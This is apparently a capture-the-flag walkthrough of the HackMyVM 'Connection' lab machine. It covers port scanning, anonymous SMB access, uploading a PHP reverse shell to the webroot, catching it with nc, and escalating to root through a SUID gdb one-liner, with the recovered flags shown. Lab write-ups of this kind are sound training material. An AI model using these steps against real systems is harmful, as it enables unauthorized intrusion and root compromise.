---
title: "Connection - HackMyVM Walkthrough"
---
nmap service scan:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/connection]
└─$ nmap -p- -sV 192.168.56.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 20:01 EDT
Nmap scan report for 192.168.56.250
Host is up (0.00060s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}
gobuster and dirb didn't enumerate any hidden files or directories. Moving on the the
SMB server. 

smbmap results: 
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/connection]
└─$ smbmap -H 192.168.56.250  
[+] IP: 192.168.56.250:445	Name: 192.168.56.250                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	share                                             	READ ONLY	
	print$                                            	NO ACCESS	Printer Drivers
	IPC$
{% endhighlight %}
smbclient anonymous connection: 

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/vulny]
└─$ smbclient //192.168.56.250/share
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 22 21:48:39 2020
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  html                                D        0  Tue Sep 22 22:20:00 2020

		7158264 blocks of size 1024. 5206628 blocks available
smb: \>
{% endhighlight %}
in the `html` directory is the default index page for the apache installation. 

I attempted the method used in this article without success: https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63 

smbmap output led me astray in thinking that we can't write to the file system. It
turns out that we can. Lesson learned: don't blindly trust the tools, test things 
out manually as well. 

Uploading reverse shell: 

{% highlight terminal %}
smb: \html\> put reverse-shell.php 
putting file reverse-shell.php as \html\reverse-shell.php (1072.8 kb/s) (average 1072.9 kb/s)
smb: \html\> ls
  .                                   D        0  Sat Oct 30 15:30:28 2021
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  index.html                          N    10701  Tue Sep 22 21:48:45 2020
  reverse-shell.php                   A     5493  Sat Oct 30 15:30:28 2021
  test.txt                            A        0  Sat Oct 16 21:26:19 2021

smb: \html\>

{% endhighlight %}
Setting up for a reverse connection and catching the connection:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/connection]
└─$ nc -nlvp 6666            
listening on [any] 6666 ...
connect to [192.168.56.224] from (UNKNOWN) [192.168.56.250] 37396
Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 15:49:46 up 34 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
{% endhighlight %}

Getting a better shell with python after checking the installed version: 

{% highlight terminal %}
$ python -c 'import pty; pty.spawn("/bin/bash");'
www-data@connection:/home/connection$ 
{% endhighlight %}

Getting the user flag:

{% highlight terminal %}
www-data@connection:/home/connection$ cat local.txt
cat local.txt
3f491443a2a6aa82bc86a3cda8c39617
{% endhighlight %}

Checking the SUID binaries:
{% highlight terminal %}
www-data@connection:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
{% endhighlight %}

gdb stands out from this list. Let's check out gtfobins for a viable way of getting a SUID shell with this binary. From gtfobins: 
>If the binary has the SUID bit set, it does not drop the elevated privileges and 
>may be abused to access the file system, escalate or maintain privileged access as
>a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like 
>Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

Attempting to get an elevated privilege shell on the machine using the example:
{% highlight terminal %}
www-data@connection:/$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh")' -ex quit
{% endhighlight %}

That seemed to work, so let's check who we are. We're still www-data user, because we excluded the option `-p` in the parameters of the python code. 

{% highlight terminal %}
www-data@connection:/$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
{% endhighlight %}

Getting the root flag: 
{% highlight terminal %}
# whoami
whoami
root
# cd root
cd root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
a7c6ea4931ab86fb54c5400204474a39
{% endhighlight %}

I submitted both flags to HackMyVM and got the points. Hooray for points. 
